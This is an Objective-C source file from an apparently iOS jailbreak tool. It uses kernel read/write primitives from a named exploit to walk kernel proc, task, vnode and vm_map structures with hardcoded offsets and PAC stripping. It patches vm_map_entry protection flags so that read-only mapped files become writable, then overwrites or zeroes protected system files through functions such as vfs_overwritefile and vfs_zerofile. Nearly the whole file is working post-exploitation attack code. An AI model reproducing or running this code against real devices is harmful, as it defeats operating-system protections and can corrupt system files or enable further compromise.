//
//  vfs.m
//  lara
//
//  Created by ruter on 28.03.26.
//

#import "xpf.h"
#include "vfs.h"
#include "darksword.h"
#include "utils.h"
#include "offsets.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <limits.h>
#include <mach-o/loader.h>
#import <Foundation/Foundation.h>

bool setkernproc(NSString *path);
NSString *getkerncache(void);
uint64_t getrootvnode(void);

#define PAGE_SZ       0x4000ULL

#define OV_NCCHILDREN  0x30
#define OV_TYPE        0x71
#define OV_UBCINFO     0x78
#define OV_NAME        0xB8
#define OV_PARENT      0xC0
#define OV_MOUNT       0xD8
#define OV_DATA        0xE0

#define OP_PID         0x60

#define ONC_NEXT       0x10
#define ONC_VP         0x48
#define ONC_NAME       0x58

#define O_PROC_RO         0x18
#define O_PROC_RO_TASK    0x08

#define O_VM_MAP_HDR      0x10
#define O_HDR_FIRST       0x08
#define O_HDR_NENTRIES    0x20
#define O_ENTRY_NEXT      0x08
#define O_ENTRY_START     0x10
#define O_ENTRY_END       0x18
#define O_ENTRY_FLAGS     0x48

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
#define FLAGS_PROT_MASK    0x780
#define FLAGS_MAXPROT_MASK 0x7800

extern uint64_t pac_mask;


#define BIT(b)    (1ULL << (b))
#define SIGN(p)          ((p) & BIT(55))

#define ENTRY_SAFE_BASE   0x30
#define FLAGS_OFF_IN_BUF  (O_ENTRY_FLAGS - ENTRY_SAFE_BASE)

static inline bool iskpointer(uint64_t p) {
    return (p != 0) && (((p >> 40) & 0xFF) == 0xFE);
}

static inline bool isheappointer(uint64_t p) {
    return (p >= 0xfffffe0000000000ULL && p <= 0xfffffeFFFFFFFFFFULL) ||
           (p >= 0xffffff8000000000ULL && p <= 0xffffffeFFFFFFFFFULL);
}

static inline bool isstrpointer(uint64_t p) {
    return iskpointer(p) || isheappointer(p);
}

static inline uint64_t pacstrip(uint64_t p);
static bool kreadstr_guarded(uint64_t ptr, char *out, size_t max_len);
static uint64_t resolvepath(const char *path);

static inline uint8_t vnode_vtype(uint64_t vn) {
    uint8_t vt = (uint8_t)ds_kread32(vn + OV_TYPE);
    if (vt == 0) vt = (uint8_t)ds_kread32(vn + 0x70);
    if (vt == 0) vt = (uint8_t)ds_kread32(vn + 0x6F);
    return vt;
}

static int vnode_getname(uint64_t vn, char *out, size_t max_len) {
    if (!out || max_len < 2) return -1;
    uint64_t name_ptr = pacstrip(ds_kread64(vn + OV_NAME));
    if (!isstrpointer(name_ptr)) { out[0] = 0; return -1; }
    if (!kreadstr_guarded(name_ptr, out, max_len)) return -1;
    return 0;
}

static uint64_t resolve_vnode_once(uint64_t vn) {
    if (!isheappointer(vn)) return 0;
    uint8_t vt = vnode_vtype(vn);
    if (vt != 5) return vn; // not a symlink
    uint64_t data = pacstrip(ds_kread64(vn + OV_DATA));
    if (!isstrpointer(data)) return vn;
    char link[256];
    if (!kreadstr_guarded(data, link, sizeof(link))) return vn;
    if (link[0] != '/') return vn;
    return resolvepath(link);
}

static inline uint64_t pacstrip(uint64_t p) {
    return SIGN(p) ? (p | pac_mask) : (p & ~pac_mask);
}

static bool kreadstr_guarded(uint64_t ptr, char *out, size_t max_len) {
    if (!out || max_len < 2) return false;
    if (!isstrpointer(ptr)) { out[0] = 0; return false; }

    size_t cap = max_len;
    if (isheappointer(ptr) && cap > 16) cap = 16;
    size_t off = 0;
    while (off + 8 <= cap) {
        uint64_t v = ds_kread64(ptr + off);
        for (int i = 0; i < 8 && off + (size_t)i < cap; i++) {
            uint8_t b = (uint8_t)((v >> (i * 8)) & 0xFF);
            out[off + (size_t)i] = (char)b;
            if (b == 0) return true;
        }
        off += 8;
    }
    out[cap - 1] = 0;
    return false;
}

static bool vnode_name_eq(uint64_t vn, const char *name) {
    uint64_t name_ptr = ds_kread64(vn + OV_NAME);
    if (!iskpointer(name_ptr)) return false;
    char buf[32];
    kreadstr_guarded(name_ptr, buf, sizeof(buf));
    return strcmp(buf, name) == 0;
}

static vfs_logcallback g_log = NULL;
static vfs_progress_callback_t g_progress = NULL;
static void klog(const char *fmt, ...) __attribute__((format(printf,1,2)));
static void klog(const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (g_log) {
        g_log(buf);
    } else {
        fprintf(stderr, "(vfs) %s\n", buf);
    }
}

void vfs_setlogcallback(vfs_logcallback cb) { g_log = cb; }
void vfs_setprogresscallback(vfs_progress_callback_t cb) { g_progress = cb; }

static void vfs_progress(double progress) {
    if (progress < 0.0) progress = 0.0;
    if (progress > 1.0) progress = 1.0;
    if (g_progress) g_progress(progress);
}

static bool g_ready = false;
static bool g_ncache_ok = false;
static uint64_t g_rootvnode = 0;
static uint64_t g_heap_prefix = 0xFFFFFE0000000000ULL;
static uint64_t g_launchd_proc = 0;
static uint64_t g_our_proc = 0;
static uint64_t g_ncache_name_off = ONC_NAME;
static uint64_t g_ncache_vp_off = ONC_VP;

static uint64_t vfs_effective_proc(void) {
    uint64_t proc = ds_get_our_proc();
    if (isheappointer(proc)) {
        return proc;
    }

    if (islcruntime()) {
        proc = ourproc();
        if (isheappointer(proc)) {
            klog("recovered proc via ourproc(): 0x%llx", proc);
            return proc;
        }
    }

    return 0;
}

static uint64_t vfs_effective_task(uint64_t proc) {
    uint64_t task = ds_get_our_task();
    if (isheappointer(task)) {
        return task;
    }

    if (islcruntime() && isheappointer(proc)) {
        task = taskbyproc(proc);
        if (isheappointer(task)) {
            klog("recovered task via taskbyproc(): 0x%llx", task);
            return task;
        }
    }

    return 0;
}

static int vfs_findprocs(void) {
    g_our_proc = vfs_effective_proc();
    if (!isheappointer(g_our_proc)) {
        klog("effective proc lookup failed");
    } else {
        klog("our proc: 0x%llx", g_our_proc);
    }

    g_launchd_proc = procbyname("launchd");
    if (!isheappointer(g_launchd_proc)) {
        if (islcruntime()) {
            klog("procbyname(\"launchd\") failed in LiveContainer; continuing without it");
            return isheappointer(g_our_proc) ? 0 : -1;
        }
        klog("procbyname(\"launchd\") failed");
        return -1;
    }

    klog("launchd proc: 0x%llx", g_launchd_proc);
    return 0;
}

static int verifyncache(void) {
    struct stat st;
    stat("/var", &st); stat("/private", &st); stat("/System", &st);
    stat("/usr", &st); stat("/sbin", &st); stat("/tmp", &st);

    klog("g_rootvnode = 0x%llx", g_rootvnode);

    uint64_t first_nc = ds_kread64(g_rootvnode + OV_NCCHILDREN);
    klog("first_nc = 0x%llx", first_nc);

    if (!isheappointer(first_nc)) {
        klog("v_ncchildren empty or invalid (0x%llx)", first_nc);
        return -1;
    }

    /*klog("namecache candidate dump:");
    for (int off = 0; off < 0x80; off += 8) {
        uint64_t val = ds_kread64(first_nc + off);
        klog("  off 0x%02x -> 0x%llx", off, val);
    }*/
    
    uint64_t nc_vp = pacstrip(ds_kread64(first_nc + g_ncache_vp_off));
    uint64_t nc_nm = pacstrip(ds_kread64(first_nc + ONC_NAME));

    klog("nc_vp = 0x%llx", nc_vp);
    klog("nc_name = 0x%llx", nc_nm);

    if (!isheappointer(nc_vp) || nc_vp == g_rootvnode) {
        uint64_t alt_vp = pacstrip(ds_kread64(first_nc + 0x50));
        if (isheappointer(alt_vp)) {
            uint8_t alt_vt = vnode_vtype(alt_vp);
            if (alt_vt != 0) {
                g_ncache_vp_off = 0x50;
                nc_vp = alt_vp;
                klog("nc_vp offset probe: 0x%llx", g_ncache_vp_off);
            }
        }
    }
    if (!isheappointer(nc_vp)) {
        klog("nc_vp not a heap pointer, skipping");
        return -1;
    }

    if (!isstrpointer(nc_nm)) {
        uint64_t found_off = 0;
        char nm[64];
        for (int off = 0x40; off <= 0x90; off += 8) {
            uint64_t p = pacstrip(ds_kread64(first_nc + off));
            if (!isstrpointer(p)) continue;
            if (!kreadstr_guarded(p, nm, sizeof(nm))) continue;
            
            size_t len = strnlen(nm, sizeof(nm) - 1);
            if (len == 0 || len >= sizeof(nm) - 1) continue;
            bool ok = true;
            for (size_t i = 0; i < len; i++) {
                if (nm[i] == '/' || (unsigned char)nm[i] < 0x20 || (unsigned char)nm[i] > 0x7E) {
                    ok = false;
                    break;
                }
            }
            if (ok) { found_off = (uint64_t)off; break; }
        }
        if (found_off == 0) {
            uint64_t vn_name = pacstrip(ds_kread64(nc_vp + OV_NAME));
            if (!isstrpointer(vn_name)) {
                klog("nc_name not a kernel pointer and vnode name invalid, skipping");
                return -1;
            }
            char vnm[32];
            kreadstr_guarded(vn_name, vnm, sizeof(vnm));
            klog("ncache ok (vnode-name fallback): first vnode='%s'", vnm);
            g_ncache_ok = true;
            return 0;
        }
        g_ncache_name_off = found_off;
        nc_nm = pacstrip(ds_kread64(first_nc + g_ncache_name_off));
        klog("nc_name offset probe: 0x%llx", g_ncache_name_off);
    }

    if (!isstrpointer(nc_nm)) {
        klog("nc_name still invalid after probe, skipping");
        return -1;
    }

    char nm[32];
    kreadstr_guarded(nc_nm, nm, sizeof(nm));

    klog("ncache ok: first child='%s'", nm);
    g_ncache_ok = true;

    return 0;
}

static uint64_t nclookupchild(uint64_t dir_vn, const char *comp) {
    uint64_t nc = ds_kread64(dir_vn + OV_NCCHILDREN);
    for (int i = 0; i < 10000 && isheappointer(nc); i++) {
        uint64_t nm_ptr = pacstrip(ds_kread64(nc + g_ncache_name_off));
        if (isstrpointer(nm_ptr)) {
            char nm[256];
            if (!kreadstr_guarded(nm_ptr, nm, sizeof(nm))) goto next_nc;
            if (strcmp(nm, comp) == 0) {
                uint64_t vp = pacstrip(ds_kread64(nc + g_ncache_vp_off));
                return isheappointer(vp) ? vp : 0;
            }
        }
    next_nc:
        nc = ds_kread64(nc + ONC_NEXT);
        if (!isheappointer(nc)) break;
    }
    return 0;
}

static uint64_t resolvepath(const char *path) {
    if (!path || path[0] != '/') return 0;

    struct stat st;
    char rp[PATH_MAX];
    const char *use = path;
    if (realpath(path, rp)) {
        use = rp;
    } else if (strncmp(path, "/var/", 5) == 0 || strcmp(path, "/var") == 0) {
        snprintf(rp, sizeof(rp), "/private/var%s", path + 4);
        use = rp;
    } else if (strncmp(path, "/tmp/", 5) == 0 || strcmp(path, "/tmp") == 0) {
        snprintf(rp, sizeof(rp), "/private/var/tmp%s", path + 4);
        use = rp;
    } else if (strncmp(path, "/etc/", 5) == 0 || strcmp(path, "/etc") == 0) {
        snprintf(rp, sizeof(rp), "/private/etc%s", path + 4);
        use = rp;
    }

    stat(use, &st);

    char tmp[1024];
    strncpy(tmp, use, sizeof(tmp) - 1); tmp[sizeof(tmp) - 1] = 0;
    for (size_t i = strlen(tmp); i > 1; i--) {
        if (tmp[i] == '/') { tmp[i] = 0; stat(tmp, &st); tmp[i] = '/'; }
    }

    if (strcmp(use, "/") == 0) return g_rootvnode;

    char pb[1024];
    strncpy(pb, use, sizeof(pb) - 1); pb[sizeof(pb) - 1] = 0;

    uint64_t cur = g_rootvnode;
    char *sv = NULL;
    char *c = strtok_r(pb, "/", &sv);
    while (c && *c) {
        uint64_t ch = nclookupchild(cur, c);
        if (!isheappointer(ch)) { klog("'%s' not in ncache", c); return 0; }
        cur = resolve_vnode_once(ch);
        c = strtok_r(NULL, "/", &sv);
    }
    return cur;
}

static int64_t vnodefilesize(uint64_t vn) {
    uint64_t ubc = ds_kread64(vn + OV_UBCINFO);
    if (!iskpointer(ubc)) return -1;

    for (int off = 0x08; off <= 0x18; off += 8) {
        int64_t sz = (int64_t)ds_kread64(ubc + off);
        if (sz > 0 && sz < 10LL * 1024 * 1024 * 1024) return sz;
    }
    return -1;
}

static uint64_t findvmmap(uint64_t task) {
    for (int off = 0x20; off <= 0x300; off += 8) {
        uint64_t candidate = pacstrip(ds_kread64(task + off));
        if (!isheappointer(candidate)) continue;
        uint32_t ne = ds_kread32(candidate + 0x10 + 0x20);
        if (ne > 0 && ne < 100000) {
            klog("vm_map: 0x%llx (task+0x%x, nentries=%u)", candidate, off, ne);
            return candidate;
        }
    }
    klog("vm_map not found in task 0x%llx", task);
    return 0;
}

static uint64_t findvmmapentry(uint64_t vm_map, uint64_t uaddr) {
    uint64_t header = vm_map + O_VM_MAP_HDR;
    uint64_t entry = pacstrip(ds_kread64(header + O_HDR_FIRST));
    uint32_t nentries = ds_kread32(header + O_HDR_NENTRIES);
    klog("vm_map entries: %u, looking for 0x%llx", nentries, uaddr);

    for (uint32_t i = 0; i < nentries && isheappointer(entry); i++) {
        uint64_t start = ds_kread64(entry + O_ENTRY_START);
        uint64_t end   = ds_kread64(entry + O_ENTRY_END);
        if (uaddr >= start && uaddr < end) {
            klog("found entry 0x%llx: 0x%llx-0x%llx", entry, start, end);
            return entry;
        }
        entry = pacstrip(ds_kread64(entry + O_ENTRY_NEXT));
    }
    klog("vm_map_entry not found for 0x%llx", uaddr);
    return 0;
}

static bool validatetask(uint64_t task) {
    for (int off = 0x20; off <= 0x300; off += 8) {
        uint64_t candidate = pacstrip(ds_kread64(task + off));
        if (!isheappointer(candidate)) continue;
        uint32_t ne = ds_kread32(candidate + 0x10 + 0x20);
        if (ne > 0 && ne < 100000) return true;
    }
    return false;
}

static uint64_t gettask(void) {
    uint64_t proc = vfs_effective_proc();
    uint64_t task = vfs_effective_task(proc);
    if (isheappointer(task)) {
        klog("task (from exploit): 0x%llx", task);
        
        uint64_t vm_map = findvmmap(task);
        if (vm_map) {
            uint32_t nentries = ds_kread32(vm_map + O_VM_MAP_HDR + O_HDR_NENTRIES);
            
            if (nentries > 0 && nentries < 10000) {
                klog("exploit task looks valid (nentries=%u)", nentries);
                return task;
            }
            
            klog("exploit task vm_map suspicious (nentries=%u)", nentries);
        }
    }

    if (!isheappointer(proc)) {
        klog("no proc/task available");
        return 0;
    }

    uint64_t proc_ro = ds_kreadptr(proc + O_PROC_RO);
    if (!isheappointer(proc_ro)) { klog("bad proc_ro"); return 0; }
    task = ds_kreadptr(proc_ro + O_PROC_RO_TASK);
    if (!isheappointer(task)) { klog("bad task"); return 0; }

    klog("task (via proc_ro): 0x%llx", task);
    return task;
}

static void patchentryprot(uint64_t entry, int prot, int maxprot) {
    uint8_t buf[0x20];
    ds_kread(entry + ENTRY_SAFE_BASE, buf, 0x20);

    uint64_t flags = *(uint64_t *)(buf + FLAGS_OFF_IN_BUF);
    uint64_t new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK) | ((uint64_t)prot << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((uint64_t)maxprot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        klog("patching entry flags: 0x%llx -> 0x%llx", flags, new_flags);
        *(uint64_t *)(buf + FLAGS_OFF_IN_BUF) = new_flags;
        ds_kwrite(entry + ENTRY_SAFE_BASE, buf, 0x20);
    }
}

bool vfs_isready(void) { return g_ready; }

int vfs_init(void) {
    klog("vfs_init starting...");
    vfs_progress(0.05);

    uint64_t proc = vfs_effective_proc();
    uint64_t task = vfs_effective_task(proc);
    if (proc) {
        g_heap_prefix = proc & 0xFFFFFF0000000000ULL;
        klog("heap PAC prefix: 0x%llx", g_heap_prefix);
    }

    if (isheappointer(proc) && isheappointer(task)) {
        klog("proc=0x%llx task=0x%llx (from exploit)", proc, task);
        g_ready = true;
        klog("file overwrite ready!");
    } else {
        klog("exploit didn't find proc/task, trying vfs scan...");
        if (vfs_findprocs() == 0 && isheappointer(g_our_proc)) {
            g_ready = true;
            klog("file overwrite ready (via vfs scan)");
        } else {
            klog("proc not found - file overwrite won't work");
        }
    }
    vfs_progress(0.35);

    if (g_ready) {
        g_rootvnode = getrootvnode();
        vfs_progress(0.60);

        if (isheappointer(g_rootvnode)) {
            if (verifyncache() != 0) {
                klog("ncache verification failed");
            }
            vfs_progress(0.85);
            klog("vfs_init done");
            return 0;
        }
        klog("rootvnode discovery disabled; listdir will be unavailable");
    }

    vfs_progress(1.0);
    klog("vfs_init done");
    return 0;
}

int vfs_listdir(const char *path, vfs_entry_t **out, int *count) {
    if (!g_ready || !g_ncache_ok) {
        klog("vfs_listdir not ready (ready=%d ncache=%d) path=%s", g_ready, g_ncache_ok, path ? path : "(null)");
        return -1;
    }

    uint64_t dvn = resolvepath(path);
    if (!isheappointer(dvn)) {
        klog("vfs_listdir resolvepath failed path=%s dvn=0x%llx", path ? path : "(null)", dvn);
        return -1;
    }

    uint8_t vtype = vnode_vtype(dvn);
    if (vtype != 0 && vtype != 2) {
        klog("vtype detected: 0x%x", vtype);
    }
    if (vtype != 2) {
        klog("vfs_listdir not dir path=%s vtype=%u", path ? path : "(null)", vtype);
        return -1;
    }

    int cap = 64;
    int n = 0;
    vfs_entry_t *ents = calloc(cap, sizeof(vfs_entry_t));

    uint64_t nc = ds_kread64(dvn + OV_NCCHILDREN);
    for (int i = 0; i < 10000 && isheappointer(nc); i++) {
        uint64_t nm_ptr = pacstrip(ds_kread64(nc + g_ncache_name_off));
        uint64_t vp = pacstrip(ds_kread64(nc + g_ncache_vp_off));
        if (isstrpointer(nm_ptr) && isheappointer(vp)) {
            char nm[256];
            if (!kreadstr_guarded(nm_ptr, nm, sizeof(nm))) goto next_nc2;
            if (nm[0] && strcmp(nm, ".") != 0 && strcmp(nm, "..") != 0) {
                if (n >= cap) { cap *= 2; ents = realloc(ents, cap * sizeof(vfs_entry_t)); }
                strncpy(ents[n].name, nm, 255);
                uint8_t vt = vnode_vtype(vp);
                if (vt == 5) {
                    uint64_t rvp = resolve_vnode_once(vp);
                    uint8_t rvt = vnode_vtype(rvp);
                    if (rvt == 2) {
                        ents[n].d_type = 4;
                    } else {
                        ents[n].d_type = 10;
                    }
                } else {
                    switch (vt) {
                        case 2: ents[n].d_type = 4; break;
                        case 1: ents[n].d_type = 8; break;
                        default: ents[n].d_type = 0; break;
                    }
                }
                
                if (path && path[0] == '/') {
                    char full[1024];
                    if (strcmp(path, "/") == 0) {
                        snprintf(full, sizeof(full), "/%s", nm);
                    } else {
                        snprintf(full, sizeof(full), "%s/%s", path, nm);
                    }
                    struct stat st;
                    (void)stat(full, &st);
                }
                n++;
            }
        }
    next_nc2:
        nc = ds_kread64(nc + ONC_NEXT);
    }

    *out = ents;
    *count = n;
    klog("vfs_listdir ok path=%s count=%d", path ? path : "(null)", n);
    for (int i = 0; i < n && i < 200; i++) {
        const char *t = (ents[i].d_type == 4) ? "dir" :
                        (ents[i].d_type == 8) ? "file" :
                        (ents[i].d_type == 10) ? "link" : "unk";
        klog("  %s (%s)", ents[i].name, t);
    }
    return 0;
}

void vfs_freelisting(vfs_entry_t *e) { free(e); }

int64_t vfs_filesize(const char *path) {
    if (!g_ready) return -1;
    uint64_t vn = resolvepath(path);
    if (!isheappointer(vn)) return -1;
    return vnodefilesize(vn);
}

int64_t vfs_read(const char *path, void *buf, size_t size, off_t offset) {
    if (!g_ready) return -1;
    if (!path || !buf || size == 0) return -1;

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        klog("vfs_read open failed: %s", strerror(errno));
        return -1;
    }

    ssize_t n = pread(fd, buf, size, offset);
    if (n < 0) {
        klog("vfs_read pread failed: %s", strerror(errno));
    }
    close(fd);
    return (int64_t)n;
}

int64_t vfs_write(const char *path, const void *buf, size_t size, off_t offset) {
    (void)path; (void)buf; (void)size; (void)offset;
    klog("vfs_write not yet implemented");
    return -1;
}

int vfs_overwritefile(const char *to, const char *from) {
    if (!g_ready) { klog("vfs not ready"); return -1; }

    klog("overwrite: %s <- %s", to, from);

    int to_fd = open(to, O_RDONLY);
    if (to_fd < 0) {
        klog("can't open target: %s", strerror(errno));
        return -1;
    }
    off_t to_size = lseek(to_fd, 0, SEEK_END);

    int from_fd = open(from, O_RDONLY);
    if (from_fd < 0) {
        klog("can't open source: %s", strerror(errno));
        close(to_fd);
        return -1;
    }
    off_t from_size = lseek(from_fd, 0, SEEK_END);

    if (from_size > to_size) {
        klog("source (%lld) > target (%lld)", from_size, to_size);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    char *to_data = mmap(NULL, to_size, PROT_READ, MAP_SHARED, to_fd, 0);
    if (to_data == MAP_FAILED) {
        klog("mmap target failed: %s", strerror(errno));
        close(from_fd);
        close(to_fd);
        return -1;
    }
    klog("target mmap'd at %p (size %lld)", to_data, to_size);

    uint64_t task = gettask();
    if (!task) {
        munmap(to_data, to_size);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    uint64_t vm_map = findvmmap(task);
    if (!vm_map) {
        munmap(to_data, to_size);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    uint64_t entry = findvmmapentry(vm_map, (uint64_t)to_data);
    if (!entry) {
        munmap(to_data, to_size);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    patchentryprot(entry, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);

    char *from_data = mmap(NULL, from_size, PROT_READ, MAP_PRIVATE, from_fd, 0);
    if (from_data == MAP_FAILED) {
        klog("mmap source failed: %s", strerror(errno));
        munmap(to_data, to_size);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    klog("writing %lld bytes...", from_size);
    memcpy(to_data, from_data, from_size);

    if (to_size > from_size) {
        memset((uint8_t *)to_data + from_size, 0, to_size - from_size);
        klog("zeroed %llu trailing bytes", to_size - from_size);
    }

    klog("overwrite done!");

    munmap(from_data, from_size);
    munmap(to_data, to_size);
    close(from_fd);
    close(to_fd);
    return 0;
}

int vfs_overwritebytes(const char *path, off_t offset, const void *data, size_t len) {
    if (!g_ready) return -1;

    int fd = open(path, O_RDONLY);
    if (fd < 0) { klog("can't open: %s", strerror(errno)); return -1; }
    off_t file_size = lseek(fd, 0, SEEK_END);

    if (file_size < offset + (off_t)len) {
        klog("offset+len beyond file size");
        close(fd); return -1;
    }

    char *mapped = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mapped == MAP_FAILED) { close(fd); return -1; }

    uint64_t task = gettask();
    if (!task) { munmap(mapped, file_size); close(fd); return -1; }

    uint64_t vm_map = findvmmap(task);
    if (!vm_map) { munmap(mapped, file_size); close(fd); return -1; }

    uint64_t entry = findvmmapentry(vm_map, (uint64_t)mapped);
    if (!entry) { munmap(mapped, file_size); close(fd); return -1; }
    patchentryprot(entry, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);

    memcpy(mapped + offset, data, len);
    klog("wrote %zu bytes at offset %lld", len, offset);

    munmap(mapped, file_size);
    close(fd);
    return 0;
}

// for jailbreak.party
int vfs_zerofile(const char *path) {
    if (!g_ready) {
        klog("vfs not ready");
        return -1;
    }

    klog("zerofile: %s", path);

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        klog("can't open target: %s", strerror(errno));
        return -1;
    }

    off_t size = lseek(fd, 0, SEEK_END);
    if (size <= 0) {
        klog("invalid file size: %lld", size);
        close(fd);
        return -1;
    }

    char *data = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
    if (data == MAP_FAILED) {
        klog("mmap failed: %s", strerror(errno));
        close(fd);
        return -1;
    }

    klog("target mmap'd at %p (size %lld)", data, size);

    uint64_t task = gettask();
    if (!task) {
        munmap(data, size);
        close(fd);
        return -1;
    }

    uint64_t vm_map = findvmmap(task);
    if (!vm_map) {
        munmap(data, size);
        close(fd);
        return -1;
    }

    uint64_t entry = findvmmapentry(vm_map, (uint64_t)data);
    if (!entry) {
        munmap(data, size);
        close(fd);
        return -1;
    }

    patchentryprot(entry, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);

    klog("zeroing %lld bytes...", size);
    memset(data, 0, size);

    klog("zerofile done!");

    munmap(data, size);
    close(fd);
    return 0;
}

int vfs_zeropage(const char *path, off_t offset) {
    if (!g_ready) return -1;

    off_t pageoff = offset & ~(PAGE_SZ - 1);

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        klog("cant open: %s", strerror(errno));
        return -1;
    }

    off_t file_size = lseek(fd, 0, SEEK_END);
    if (file_size <= pageoff) {
        klog("offset beyond file size");
        close(fd);
        return -1;
    }

    void *mapped = mmap(NULL, PAGE_SZ, PROT_READ, MAP_SHARED, fd, pageoff);
    if (mapped == MAP_FAILED) {
        klog("mmap failed: %s", strerror(errno));
        close(fd);
        return -1;
    }

    uint64_t task = gettask();
    if (!task) {
        munmap(mapped, PAGE_SZ);
        close(fd);
        return -1;
    }

    uint64_t vm_map = findvmmap(task);
    if (!vm_map) {
        munmap(mapped, PAGE_SZ);
        close(fd);
        return -1;
    }

    uint64_t entry = findvmmapentry(vm_map, (uint64_t)mapped);
    if (!entry) {
        munmap(mapped, PAGE_SZ);
        close(fd);
        return -1;
    }

    patchentryprot(entry, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);

    size_t zerolen = PAGE_SZ;
    if (pageoff + zerolen > file_size)
        zerolen = file_size - pageoff;

    memset(mapped, 0, zerolen);

    klog("zeroed mapped page (shared) containing offset 0x%llx (page 0x%llx)", offset, pageoff);

    munmap(mapped, PAGE_SZ);
    close(fd);
    return 0;
}

uint64_t getrootvnode(void) {
    if (!g_ready) return -1;
    uint64_t launchd_proc = procbypid(1);
    uint64_t launchd_vnode = ds_kread64(launchd_proc + off_proc_p_textvp);
    launchd_vnode = pacstrip(launchd_vnode);
    
    uint64_t sbin_vnode = ds_kread64(launchd_vnode + off_vnode_v_parent);
    sbin_vnode = pacstrip(sbin_vnode);
    
    uint64_t root_vnode = ds_kread64(sbin_vnode + off_vnode_v_parent);
    root_vnode = pacstrip(root_vnode);
    
    return root_vnode;
};
